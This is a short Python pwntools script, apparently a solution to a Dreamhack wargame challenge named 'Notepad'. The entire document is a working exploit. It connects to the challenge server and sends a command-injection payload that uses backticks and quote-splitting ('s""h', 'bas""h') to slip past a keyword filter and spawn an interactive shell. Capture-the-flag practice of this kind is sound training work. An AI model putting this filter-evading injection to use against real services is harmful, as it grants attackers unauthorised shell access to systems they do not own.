#!/usr/bin/python3

from pwn import *

p = remote("host1.dreamhack.games", 18122)
#p = process("/root/dreamhack/notepad//Notepad")
#context.log_level = 'debug'

payload ='`s""h -c bas""h`||'

p.sendlineafter("-\n", payload)

p.interactive()
